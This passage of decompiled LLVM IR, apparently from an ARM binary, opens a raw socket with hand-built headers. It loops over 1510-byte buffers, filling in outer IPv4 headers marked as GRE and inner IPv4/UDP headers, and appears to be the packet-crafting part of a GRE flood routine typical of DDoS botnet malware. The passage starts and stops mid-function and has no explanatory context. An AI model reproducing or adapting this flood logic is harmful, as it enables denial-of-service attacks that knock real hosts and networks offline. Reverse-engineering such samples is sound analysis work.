  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b6e4 = load i32, i32* @r5, align 4
  store i32 %v0_b6e4, i32* %r1.global-to-local, align 4
  %v0_b6e8 = load i32, i32* @r4, align 4
  store i32 %v0_b6e8, i32* %r0.global-to-local, align 4
  %v4_b6ec = inttoptr i32 %v0_b6e4 to i32*
  %v5_b6ec = call i32 @function_b240(i32 %v0_b6e8, i32* %v4_b6ec, i32 1, i32 1)
  %v1_b6f4 = urem i32 %v5_b6ec, 256
  store i32 %v1_b6f4, i32* %ip.global-to-local, align 4
  %v0_b6f8 = load i32, i32* @r5, align 4
  store i32 %v0_b6f8, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b704 = load i32, i32* @r4, align 4
  store i32 %v0_b704, i32* %r0.global-to-local, align 4
  %v5_b70c = inttoptr i32 %v0_b6f8 to i32*
  %v6_b70c = call i32 @function_b240(i32 %v0_b704, i32* %v5_b70c, i32 19, i32 0)
  %v0_b714 = load i32, i32* @r5, align 4
  store i32 %v0_b714, i32* %r1.global-to-local, align 4
  %v2_b718 = load i32, i32* @global_var_1cdf4.141, align 4
  store i32 %v2_b718, i32* %r3.global-to-local, align 4
  store i32 %v6_b70c, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b724 = load i32, i32* @r4, align 4
  store i32 %v0_b724, i32* %r0.global-to-local, align 4
  %v4_b728 = inttoptr i32 %v0_b714 to i32*
  %v5_b728 = call i32 @function_b240(i32 %v0_b724, i32* %v4_b728, i32 25, i32 %v2_b718)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b73c = call i32 @_socket(i32 2, i32 3, i32 6)
  store i32 %v3_b73c, i32* %r0.global-to-local, align 4
  %v7_b740 = icmp eq i32 %v3_b73c, -1
  store i1 %v7_b740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b740, label %dec_label_pc_bc24, label %dec_label_pc_b74c

dec_label_pc_b74c:                                ; preds = %dec_label_pc_b5e8
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b754 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b754, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b768 = call i32 @_setsockopt()
  store i32 %v0_b768, i32* %r0.global-to-local, align 4
  %v7_b76c = icmp eq i32 %v0_b768, -1
  store i1 %v7_b76c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b76c, label %dec_label_pc_bc1c, label %dec_label_pc_b774

dec_label_pc_b774:                                ; preds = %dec_label_pc_b74c
  %v0_b774 = load i32, i32* @sl, align 4
  %v3_b774 = mul i32 %v0_b774, 65536
  store i32 %v3_b774, i32* %sl.global-to-local, align 4
  %v0_b778 = load i32, i32* @r8, align 4
  %v3_b778 = mul i32 %v0_b778, 65536
  store i32 %v3_b778, i32* %r8.global-to-local, align 4
  %v0_b780 = load i32, i32* @r7, align 4
  %v3_b780 = mul i32 %v0_b780, 65536
  store i32 %v3_b780, i32* %r7.global-to-local, align 4
  %v0_b784 = load i32, i32* @r6, align 4
  %v1_b784 = urem i32 %v0_b784, 256
  store i32 %v1_b784, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_b78c = urem i32 %v0_b780, 65536
  store i32 %v3_b78c, i32* %r2.global-to-local, align 4
  %v3_b790 = urem i32 %v0_b774, 65536
  store i32 %v3_b790, i32* %r3.global-to-local, align 4
  %v3_b794 = urem i32 %v0_b778, 65536
  store i32 %v3_b794, i32* %r1.global-to-local, align 4
  %v0_b798 = load i32, i32* @fp, align 4
  %v2_b798 = icmp eq i32 %v0_b798, 0
  store i1 %v2_b798, i1* %cpsr_z.global-to-local, align 1
  %tmp86 = icmp slt i32 %v0_b798, 1
  br i1 %tmp86, label %dec_label_pc_bd44, label %dec_label_pc_b7b8

dec_label_pc_b7b8:                                ; preds = %dec_label_pc_b774
  %v3_b7bc = mul i32 %v5_b6d4, 65536
  %v0_b780.not = or i32 %v0_b780, -65536
  %v1_b7c4 = xor i32 %v0_b780.not, 65535
  %v1_b7cc = add i32 %v3_b7bc, 4325376
  %v1_b7d0 = urem i32 %v0_b774, 256
  %v3_b7d8 = udiv i32 %v1_b7cc, 256
  %v1_b7dc = add i32 %v3_b7bc, 524288
  %v1_b7e4 = add i32 %v3_b7bc, 1835008
  %v1_b7e8 = urem i32 %v0_b778, 256
  %v1_b7ec = and i32 %v3_b7d8, 65280
  store i32 %v1_b7ec, i32* %r0.global-to-local, align 4
  %v3_b7f4 = udiv i32 %v1_b7e4, 256
  %tmp87 = mul nsw i32 %v1_b7c4, 256
  %v1_b80c = and i32 %v3_b7f4, 65280
  store i32 %v1_b80c, i32* %ip.global-to-local, align 4
  %v1_b810 = and i32 %tmp87, and (i32 ptrtoint (i32* @global_var_ff00.79 to i32), i32 16776960)
  store i32 %v1_b810, i32* %lr.global-to-local, align 4
  %tmp89 = udiv i32 %v1_b7c4, 256
  %v4_b7fc = sdiv i32 %v1_b7cc, 16777216
  %v5_b82c = trunc i32 %tmp89 to i8
  %v3_b838 = mul nuw nsw i32 %v1_b7d0, 256
  %v3_b840 = ashr i32 %v1_b7cc, 31
  %v3_b844 = mul nuw nsw i32 %v1_b7e8, 256
  store i32 %v3_b844, i32* %r5.global-to-local, align 4
  %tmp90 = udiv i32 %v0_b774, 256
  %v4_b848 = urem i32 %tmp90, 256
  %v5_b848 = or i32 %v4_b848, %v3_b838
  store i32 %v5_b848, i32* %r7.global-to-local, align 4
  %v3_b84c = udiv i32 %v1_b7dc, 256
  %tmp91 = udiv i32 %v0_b778, 256
  %v4_b850 = urem i32 %tmp91, 256
  %v5_b850 = or i32 %v4_b850, %v3_b844
  store i32 %v5_b850, i32* %sl.global-to-local, align 4
  %v3_b85c = sdiv i32 %v3_b780, 16777216
  %v7_b85c = sdiv i32 %v1_b7e4, 16777216
  %v1_b860 = and i32 %v3_b84c, 65280
  store i32 %v1_b860, i32* %r6.global-to-local, align 4
  %v3_b864 = ashr i32 %v3_b780, 31
  %v3_b868 = ashr i32 %v1_b7e4, 31
  %v3_b86c = udiv i32 %v1_b7c4, 65536
  %v4_b870 = udiv i32 %v1_b7dc, 16777216
  %v5_b870 = or i32 %v4_b870, %v1_b860
  store i32 %v5_b870, i32* %r8.global-to-local, align 4
  store i32 %v1_b7d0, i32* %r1.global-to-local, align 4
  store i32 %v1_b7e8, i32* %r2.global-to-local, align 4
  %v3_b88838 = udiv i32 %v1_b860, 256
  store i32 %v3_b88838, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v4_b8e8 = sext i8 %v5_b678 to i32
  %v2_b9e8 = icmp eq i32 %v1_b784, 0
  %sext18 = mul i32 %v0_b774, 16777216
  %v4_b9fc = sdiv i32 %sext18, 16777216
  %sext19 = mul i32 %v1_b7dc, 256
  %v4_ba10 = sdiv i32 %sext19, 16777216
  %sext20 = mul i32 %v0_b778, 16777216
  %v4_ba18 = sdiv i32 %sext20, 16777216
  %v1_b8fc = trunc i32 %v3_b840 to i8
  %v1_ba20 = trunc i32 %v4_ba10 to i8
  br label %dec_label_pc_b89c

dec_label_pc_b89c:                                ; preds = %bb98, %dec_label_pc_b7b8
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_b8a8 = call i32 @_calloc(i32 1510, i32 4)
  store i32 %v2_b8a8, i32* %r0.global-to-local, align 4
  store i32 %v2_b608, i32* %r1.global-to-local, align 4
  %v3_b8b0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b8b0, i32* %r3.global-to-local, align 4
  %v2_b8b4 = load i32, i32* %r4.global-to-local, align 4
  %v5_b8b4 = mul i32 %v2_b8b4, 4
  %v6_b8b4 = add i32 %v5_b8b4, %v2_b608
  %v7_b8b4 = inttoptr i32 %v6_b8b4 to i32*
  store i32 %v2_b8a8, i32* %v7_b8b4, align 4
  %v0_b8b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b8b8 = load i32, i32* %r3.global-to-local, align 4
  %v4_b8b8 = mul i32 %v1_b8b8, 4
  %v5_b8b8 = add i32 %v4_b8b8, %v0_b8b8
  %v6_b8b8 = inttoptr i32 %v5_b8b8 to i32*
  %v7_b8b8 = load i32, i32* %v6_b8b8, align 4
  store i32 %v7_b8b8, i32* %r4.global-to-local, align 4
  %v1_b8bc = inttoptr i32 %v7_b8b8 to i8*
  %v2_b8bc = load i8, i8* %v1_b8bc, align 1
  %tmp = urem i8 %v2_b8bc, 16
  %v1_b8c0 = zext i8 %tmp to i32
  %v1_b8c4 = or i32 %v1_b8c0, 64
  store i32 %v1_b8c4, i32* %r2.global-to-local, align 4
  %v1_b8c8 = trunc i32 %v1_b8c4 to i8
  store i8 %v1_b8c8, i8* %v1_b8bc, align 1
  %v0_b8cc = load i32, i32* %r4.global-to-local, align 4
  %v1_b8cc = inttoptr i32 %v0_b8cc to i8*
  %v2_b8cc = load i8, i8* %v1_b8cc, align 1
  %v1_b8d0 = and i8 %v2_b8cc, -16
  %v1_b8d4 = or i8 %v1_b8d0, 5
  store i32 %v1_b688, i32* %r2.global-to-local, align 4
  store i8 %v1_b8d4, i8* %v1_b8cc, align 1
  %v2_b8e4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b8e4 = add i32 %v2_b8e4, 1
  %v4_b8e4 = inttoptr i32 %v3_b8e4 to i8*
  store i8 %v5_b640, i8* %v4_b8e4, align 1
  store i32 %v4_b8e8, i32* %r1.global-to-local, align 4
  %v2_b8ec = load i32, i32* %r4.global-to-local, align 4
  %v3_b8ec = add i32 %v2_b8ec, 8
  %v4_b8ec = inttoptr i32 %v3_b8ec to i8*
  store i8 %v5_b678, i8* %v4_b8ec, align 1
  store i32 %v3_b840, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_b8f8 = load i32, i32* %r2.global-to-local, align 4
  %v9_b8f8 = icmp eq i32 %v0_b8f8, 0
  store i1 %v9_b8f8, i1* %cpsr_z.global-to-local, align 1
  %v2_b8fc = load i32, i32* %r4.global-to-local, align 4
  %v3_b8fc = add i32 %v2_b8fc, 3
  %v4_b8fc = inttoptr i32 %v3_b8fc to i8*
  store i8 %v1_b8fc, i8* %v4_b8fc, align 1
  store i32 %v4_b7fc, i32* %r2.global-to-local, align 4
  %v0_b904 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b904, label %.thread22, label %.thread

.thread:                                          ; preds = %dec_label_pc_b89c
  %v1_b904 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_b904, i32* %r3.global-to-local, align 4
  %v2_b908 = trunc i32 %v1_b904 to i8
  %v3_b908 = load i32, i32* %r4.global-to-local, align 4
  %v4_b908 = add i32 %v3_b908, 7
  %v5_b908 = inttoptr i32 %v4_b908 to i8*
  store i8 %v2_b908, i8* %v5_b908, align 1
  %v0_b90c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b90c.pr.pr, label %.thread22, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_b910 = load i32, i32* %r4.global-to-local, align 4
  %v4_b910 = add i32 %v3_b910, 6
  %v5_b910 = inttoptr i32 %v4_b910 to i8*
  store i8 64, i8* %v5_b910, align 1
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_b89c, %.thread, %bb
  %v0_b914 = load i32, i32* %r2.global-to-local, align 4
  %v1_b914 = trunc i32 %v0_b914 to i8
  %v2_b914 = load i32, i32* %r4.global-to-local, align 4
  %v3_b914 = add i32 %v2_b914, 2
  %v4_b914 = inttoptr i32 %v3_b914 to i8*
  store i8 %v1_b914, i8* %v4_b914, align 1
  store i32 %v3_b864, i32* %r2.global-to-local, align 4
  store i32 %v3_b85c, i32* %r1.global-to-local, align 4
  %v2_b924 = load i32, i32* %r4.global-to-local, align 4
  %v3_b924 = add i32 %v2_b924, 9
  %v4_b924 = inttoptr i32 %v3_b924 to i8*
  store i8 47, i8* %v4_b924, align 1
  %v0_b928 = load i32, i32* %r2.global-to-local, align 4
  %v1_b928 = trunc i32 %v0_b928 to i8
  %v2_b928 = load i32, i32* %r4.global-to-local, align 4
  %v3_b928 = add i32 %v2_b928, 5
  %v4_b928 = inttoptr i32 %v3_b928 to i8*
  store i8 %v1_b928, i8* %v4_b928, align 1
  %v3_b92c = load i32, i32* %stack_var_-40, align 4
  %v5_b934 = mul i32 %v3_b92c, 24
  store i32 %v5_b934, i32* %r3.global-to-local, align 4
  store i32 %v5_b728, i32* %r2.global-to-local, align 4
  %v1_b93c = load i32, i32* %r4.global-to-local, align 4
  %v2_b93c = add i32 %v1_b93c, 12
  %v3_b93c = inttoptr i32 %v2_b93c to i32*
  store i32 %v5_b728, i32* %v3_b93c, align 4
  %v0_b940 = load i32, i32* %r3.global-to-local, align 4
  %v1_b940 = load i32, i32* @sb, align 4
  %v2_b940 = add i32 %v1_b940, %v0_b940
  store i32 %v2_b940, i32* %r3.global-to-local, align 4
  %v1_b944 = add i32 %v2_b940, 16
  %v2_b944 = inttoptr i32 %v1_b944 to i32*
  %v3_b944 = load i32, i32* %v2_b944, align 4
  store i32 %v3_b944, i32* %r2.global-to-local, align 4
  %v0_b948 = load i32, i32* %r1.global-to-local, align 4
  %v1_b948 = trunc i32 %v0_b948 to i8
  %v2_b948 = load i32, i32* %r4.global-to-local, align 4
  %v3_b948 = add i32 %v2_b948, 4
  %v4_b948 = inttoptr i32 %v3_b948 to i8*
  store i8 %v1_b948, i8* %v4_b948, align 1
  store i32 101, i32* %r3.global-to-local, align 4
  %v0_b950 = load i32, i32* %r4.global-to-local, align 4
  %v1_b950 = add i32 %v0_b950, 20
  store i32 %v1_b950, i32* %r1.global-to-local, align 4
  %v3_b954 = add i32 %v0_b950, 22
  %v4_b954 = inttoptr i32 %v3_b954 to i8*
  store i8 101, i8* %v4_b954, align 1
  %v0_b958 = load i32, i32* %r2.global-to-local, align 4
  %v1_b958 = load i32, i32* %r4.global-to-local, align 4
  %v2_b958 = add i32 %v1_b958, 16
  %v3_b958 = inttoptr i32 %v2_b958 to i32*
  store i32 %v0_b958, i32* %v3_b958, align 4
  %v0_b95c = load i32, i32* %r4.global-to-local, align 4
  %v1_b95c = add i32 %v0_b95c, 24
  store i32 %v1_b95c, i32* %r0.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v0_b964 = load i32, i32* %r3.global-to-local, align 4
  %v1_b964 = add i32 %v0_b964, -93
  store i32 %v1_b964, i32* %r3.global-to-local, align 4
  %v2_b968 = load i32, i32* %r1.global-to-local, align 4
  %v3_b968 = add i32 %v2_b968, 3
  %v4_b968 = inttoptr i32 %v3_b968 to i8*
  store i8 88, i8* %v4_b968, align 1
  %v0_b96c = load i32, i32* %r3.global-to-local, align 4
  %v1_b96c = trunc i32 %v0_b96c to i8
  %v2_b96c = load i32, i32* %r0.global-to-local, align 4
  %v3_b96c = add i32 %v2_b96c, 12
  %v4_b96c = inttoptr i32 %v3_b96c to i8*
  store i8 %v1_b96c, i8* %v4_b96c, align 1
  %v0_b970 = load i32, i32* %ip.global-to-local, align 4
  %v1_b970 = trunc i32 %v0_b970 to i8
  %v2_b970 = load i32, i32* %r0.global-to-local, align 4
  %v3_b970 = add i32 %v2_b970, 13
  %v4_b970 = inttoptr i32 %v3_b970 to i8*
  store i8 %v1_b970, i8* %v4_b970, align 1
  %v0_b974 = load i32, i32* %r4.global-to-local, align 4
  %v1_b974 = add i32 %v0_b974, 38
  %v2_b974 = inttoptr i32 %v1_b974 to i8*
  %v3_b974 = load i8, i8* %v2_b974, align 1
  %tmp103 = urem i8 %v3_b974, 16
  %v1_b978 = zext i8 %tmp103 to i32
  %v1_b97c = or i32 %v1_b978, 64
  store i32 %v1_b97c, i32* %r3.global-to-local, align 4
  %v1_b980 = trunc i32 %v1_b97c to i8
  store i8 %v1_b980, i8* %v2_b974, align 1
  %v0_b984 = load i32, i32* %r4.global-to-local, align 4
  %v1_b984 = add i32 %v0_b984, 38
  %v2_b984 = inttoptr i32 %v1_b984 to i8*
  %v3_b984 = load i8, i8* %v2_b984, align 1
  %v1_b988 = and i8 %v3_b984, -16
  %v1_b98c = or i8 %v1_b988, 5
  store i8 %v1_b98c, i8* %v2_b984, align 1
  %v0_b998 = load i32, i32* %r4.global-to-local, align 4
  %v1_b998 = add i32 %v0_b998, 38
  store i32 %v1_b998, i32* %r5.global-to-local, align 4
  %v3_b99c = add i32 %v0_b998, 39
  %v4_b99c = inttoptr i32 %v3_b99c to i8*
  store i8 %v5_b640, i8* %v4_b99c, align 1
  store i32 %v7_b85c, i32* %r1.global-to-local, align 4
  store i32 %tmp89, i32* %r3.global-to-local, align 4
  store i32 %v3_b868, i32* %r2.global-to-local, align 4
  %v2_b9ac = load i32, i32* %r5.global-to-local, align 4
  %v3_b9ac = add i32 %v2_b9ac, 4
  %v4_b9ac = inttoptr i32 %v3_b9ac to i8*
  store i8 %v5_b82c, i8* %v4_b9ac, align 1
  %v0_b9b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b9b0 = trunc i32 %v0_b9b0 to i8
  %v2_b9b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_b9b0 = add i32 %v2_b9b0, 2
  %v4_b9b0 = inttoptr i32 %v3_b9b0 to i8*
  store i8 %v1_b9b0, i8* %v4_b9b0, align 1
  %v0_b9b4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b9b4, label %bb93, label %bb92

bb92:                                             ; preds = %.thread22
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb93

bb93:                                             ; preds = %.thread22, %bb92
  store i32 %v3_b86c, i32* %r1.global-to-local, align 4
  %v0_b9bc = load i32, i32* %r2.global-to-local, align 4
  %v1_b9bc = trunc i32 %v0_b9bc to i8
  %v2_b9bc = load i32, i32* %r5.global-to-local, align 4
  %v3_b9bc = add i32 %v2_b9bc, 3
  %v4_b9bc = inttoptr i32 %v3_b9bc to i8*
  store i8 %v1_b9bc, i8* %v4_b9bc, align 1
  store i32 %v4_b8e8, i32* %r2.global-to-local, align 4
  %v0_b9c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b9c4, label %bb95, label %bb94

bb94:                                             ; preds = %bb93
  %v1_b9c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_b9c4 = trunc i32 %v1_b9c4 to i8
  %v3_b9c4 = load i32, i32* %r5.global-to-local, align 4
  %v4_b9c4 = add i32 %v3_b9c4, 6
  %v5_b9c4 = inttoptr i32 %v4_b9c4 to i8*
  store i8 %v2_b9c4, i8* %v5_b9c4, align 1
  br label %bb95

bb95:                                             ; preds = %bb93, %bb94
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_b9cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b9cc = trunc i32 %v0_b9cc to i8
  %v2_b9cc = load i32, i32* %r5.global-to-local, align 4
  %v3_b9cc = add i32 %v2_b9cc, 5
  %v4_b9cc = inttoptr i32 %v3_b9cc to i8*
  store i8 %v1_b9cc, i8* %v4_b9cc, align 1
  %v0_b9d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b9d0 = trunc i32 %v0_b9d0 to i8
  %v2_b9d0 = load i32, i32* %r5.global-to-local, align 4
  %v3_b9d0 = add i32 %v2_b9d0, 8
  %v4_b9d0 = inttoptr i32 %v3_b9d0 to i8*
  store i8 %v1_b9d0, i8* %v4_b9d0, align 1
  %v0_b9d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b9d4, label %bb97, label %bb96

bb96:                                             ; preds = %bb95
  %v1_b9d4 = load i32, i32* %ip.global-to-local, align 4
  %v2_b9d4 = trunc i32 %v1_b9d4 to i8
  %v3_b9d4 = load i32, i32* %r5.global-to-local, align 4
  %v4_b9d4 = add i32 %v3_b9d4, 7
  %v5_b9d4 = inttoptr i32 %v4_b9d4 to i8*
  store i8 %v2_b9d4, i8* %v5_b9d4, align 1
  br label %bb97

bb97:                                             ; preds = %bb95, %bb96
  %v0_b9d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9d8 = trunc i32 %v0_b9d8 to i8
  %v2_b9d8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b9d8 = add i32 %v2_b9d8, 9
  %v4_b9d8 = inttoptr i32 %v3_b9d8 to i8*
  store i8 %v1_b9d8, i8* %v4_b9d8, align 1
  %v0_b9dc = call i32 @function_10bd8()
  store i32 %v0_b9dc, i32* %r0.global-to-local, align 4
  store i32 %v1_b784, i32* %r1.global-to-local, align 4
  store i1 %v2_b9e8, i1* %cpsr_z.global-to-local, align 1
  %v1_b9ec = sub i32 1023, %v0_b9dc
  store i32 %v1_b9ec, i32* %r3.global-to-local, align 4
  br i1 %v2_b9e8, label %.thread23, label %.thread24

.thread23:                                        ; preds = %bb97
  %v2_b9f4 = load i32, i32* %r5.global-to-local, align 4
  %v3_b9f4 = add i32 %v2_b9f4, 16
  %v4_b9f4 = inttoptr i32 %v3_b9f4 to i32*
  store i32 %v1_b9ec, i32* %v4_b9f4, align 4
  br label %bb98

.thread24:                                        ; preds = %bb97
  %v1_b9f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b9f0 = add i32 %v1_b9f0, 16
  %v3_b9f0 = inttoptr i32 %v2_b9f0 to i32*
  %v4_b9f0 = load i32, i32* %v3_b9f0, align 4
  store i32 %v4_b9f0, i32* %r3.global-to-local, align 4
  %v2_b9f8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b9f8 = add i32 %v2_b9f8, 16
  %v4_b9f8 = inttoptr i32 %v3_b9f8 to i32*
  store i32 %v4_b9f0, i32* %v4_b9f8, align 4
  br label %bb98

bb98:                                             ; preds = %.thread23, %.thread24
  store i32 %v4_b9fc, i32* %r3.global-to-local, align 4
  %v0_ba00 = load i32, i32* %r4.global-to-local, align 4
  %v1_ba00 = add i32 %v0_ba00, 58
  store i32 %v1_ba00, i32* %r6.global-to-local, align 4
  %v1_ba04 = load i32, i32* %r5.global-to-local, align 4
  %v2_ba04 = add i32 %v1_ba04, 12
  %v3_ba04 = inttoptr i32 %v2_ba04 to i32*
  store i32 %v0_b9dc, i32* %v3_ba04, align 4
  %v0_ba08 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba08 = trunc i32 %v0_ba08 to i8
  %v2_ba08 = load i32, i32* %r6.global-to-local, align 4
  %v3_ba08 = add i32 %v2_ba08, 1
  %v4_ba08 = inttoptr i32 %v3_ba08 to i8*
  store i8 %v1_ba08, i8* %v4_ba08, align 1
  %v3_ba0c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ba0c, i32* %r3.global-to-local, align 4
  store i32 %v4_ba10, i32* %r2.global-to-local, align 4
  %v1_ba14 = add i32 %v3_ba0c, 1
  store i32 %v1_ba14, i32* %r4.global-to-local, align 4
  store i32 %v4_ba18, i32* %r1.global-to-local, align 4
  %v1_ba1c = load i32, i32* @fp, align 4
  %v9_ba1c = icmp eq i32 %v1_ba14, %v1_ba1c
  store i1 %v9_ba1c, i1* %cpsr_z.global-to-local, align 1
  %v2_ba20 = load i32, i32* %r6.global-to-local, align 4
  %v3_ba20 = add i32 %v2_ba20, 5
  %v4_ba20 = inttoptr i32 %v3_ba20 to i8*
  store i8 %v1_ba20, i8* %v4_ba20, align 1
  %v0_ba24 = load i32, i32* %r7.global-to-local, align 4
  %v1_ba24 = trunc i32 %v0_ba24 to i8
  %v2_ba24 = load i32, i32* %r6.global-to-local, align 4
  %v3_ba24 = inttoptr i32 %v2_ba24 to i8*
  store i8 %v1_ba24, i8* %v3_ba24, align 1
  %v0_ba28 = load i32, i32* %sl.global-to-local, align 4
  %v1_ba28 = trunc i32 %v0_ba28 to i8
  %v2_ba28 = load i32, i32* %r6.global-to-local, align 4
  %v3_ba28 = add i32 %v2_ba28, 2
  %v4_ba28 = inttoptr i32 %v3_ba28 to i8*
  store i8 %v1_ba28, i8* %v4_ba28, align 1
  %v0_ba2c = load i32, i32* %r1.global-to-local, align 4
  %v1_ba2c = trunc i32 %v0_ba2c to i8
  %v2_ba2c = load i32, i32* %r6.global-to-local, align 4
  %v3_ba2c = add i32 %v2_ba2c, 3
  %v4_ba2c = inttoptr i32 %v3_ba2c to i8*
  store i8 %v1_ba2c, i8* %v4_ba2c, align 1
  %v0_ba30 = load i32, i32* %r8.global-to-local, align 4
  %v1_ba30 = trunc i32 %v0_ba30 to i8
  %v2_ba30 = load i32, i32* %r6.global-to-local, align 4
  %v3_ba30 = add i32 %v2_ba30, 4
  %v4_ba30 = inttoptr i32 %v3_ba30 to i8*
  store i8 %v1_ba30, i8* %v4_ba30, align 1
  %v0_ba34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ba34, i32* %stack_var_-40, align 4
  %v5_ba38 = icmp slt i32 %v1_ba14, %v1_ba1c
  br i1 %v5_ba38, label %dec_label_pc_b89c, label %dec_label_pc_ba3c

dec_label_pc_ba3c:                                ; preds = %bb98
  %v1_ba44 = add i32 %v5_b6d4, 8
  store i32 %v1_ba44, i32* %r2.global-to-local, align 4
  %v1_ba48 = add i32 %v5_b6d4, 66
  store i32 %v1_ba48, i32* %r3.global-to-local, align 4
  %v0_ba54.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_ba54.preheader

dec_label_pc_ba54.preheader:                      ; preds = %dec_label_pc_ba3c, %dec_label_pc_bd44
  %v0_ba54.pre = phi i32 [ %v0_ba54.pre.pre, %dec_label_pc_ba3c ], [ %v0_b798, %dec_label_pc_bd44 ]
  %stack_var_-160.0.ph = phi i32 [ %v1_ba48, %dec_label_pc_ba3c ], [ %v1_bd50, %dec_label_pc_bd44 ]
  %stack_var_-156.0.ph = phi i32 [ %v1_ba44, %dec_label_pc_ba3c ], [ %v1_bd4c, %dec_label_pc_bd44 ]
  %v3_bca4 = icmp eq i32 %v3_b78c, 65535
  %v2_bd14 = icmp eq i32 %v1_b784, 0
  %v2_baf8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_bb10 = ptrtoint i32* %stack_var_-48 to i32
  %v2_bb20 = ptrtoint i32* %stack_var_-52 to i32
  %v2_bb2c = ptrtoint i32* %stack_var_-50 to i32
  %v2_bb40 = icmp eq i32 %v1_b6f4, 0
  %v2_ba9c = icmp eq i32 %v5_b728, -1
  %v7_ba9c = icmp eq i32 %v5_b728, -1
  br label %dec_label_pc_ba54

dec_label_pc_ba54:                                ; preds = %dec_label_pc_bb48, %dec_label_pc_ba54.preheader
  %v0_ba54 = phi i32 [ %v0_ba54.pre, %dec_label_pc_ba54.preheader ], [ %v1_bc0c, %dec_label_pc_bb48 ]
  %v2_ba54 = icmp eq i32 %v0_ba54, 0
  store i1 %v2_ba54, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp99 = icmp slt i32 %v0_ba54, 1
  br label %dec_label_pc_ba5c

dec_label_pc_ba5c:                                ; preds = %dec_label_pc_ba5c, %dec_label_pc_ba54
  br i1 %tmp99, label %dec_label_pc_ba5c, label %dec_label_pc_ba60

dec_label_pc_ba60:                                ; preds = %dec_label_pc_ba5c
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  br label %dec_label_pc_ba6c

dec_label_pc_ba6c:                                ; preds = %dec_label_pc_bb48, %dec_label_pc_ba60
  %v1_ba80 = phi i32 [ %v1_bc08, %dec_label_pc_bb48 ], [ 0, %dec_label_pc_ba60 ]
  %v5_ba70 = mul i32 %v1_ba80, 24
  %v1_ba74 = load i32, i32* @sb, align 4
  %v2_ba74 = add i32 %v1_ba74, %v5_ba70
  store i32 %v2_ba74, i32* %r3.global-to-local, align 4
  store i32 %v2_b608, i32* %r1.global-to-local, align 4
  %v1_ba7c = add i32 %v2_ba74, 20
  %v2_ba7c = inttoptr i32 %v1_ba7c to i8*
  %v3_ba7c = load i8, i8* %v2_ba7c, align 1
  %v4_ba7c = zext i8 %v3_ba7c to i32
  store i32 %v4_ba7c, i32* %r2.global-to-local, align 4
  %v4_ba80 = mul i32 %v1_ba80, 4
  %v5_ba80 = add i32 %v4_ba80, %v2_b608
  %v6_ba80 = inttoptr i32 %v5_ba80 to i32*
  %v7_ba80 = load i32, i32* %v6_ba80, align 4
  store i32 %v7_ba80, i32* @r5, align 4
  %v7_ba84 = icmp eq i8 %v3_ba7c, 31
  store i1 %v7_ba84, i1* %cpsr_z.global-to-local, align 1
  %v1_ba88 = add i32 %v7_ba80, 24
  store i32 %v1_ba88, i32* @r8, align 4
  %v1_ba8c = add i32 %v7_ba80, 38
  store i32 %v1_ba8c, i32* @r6, align 4
  %v1_ba90 = add i32 %v7_ba80, 58
  store i32 %v1_ba90, i32* @r7, align 4
  %tmp104 = icmp ult i8 %v3_ba7c, 32
  br i1 %tmp104, label %dec_label_pc_bc2c, label %dec_label_pc_ba98

dec_label_pc_ba98:                                ; preds = %dec_label_pc_ba6c
  store i32 %v5_b728, i32* %r2.global-to-local, align 4
  store i1 %v7_ba9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ba9c, label %dec_label_pc_bc94, label %dec_label_pc_baa4

dec_label_pc_baa4:                                ; preds = %dec_label_pc_bc2c, %dec_label_pc_ba98
  store i32 %v3_b78c, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
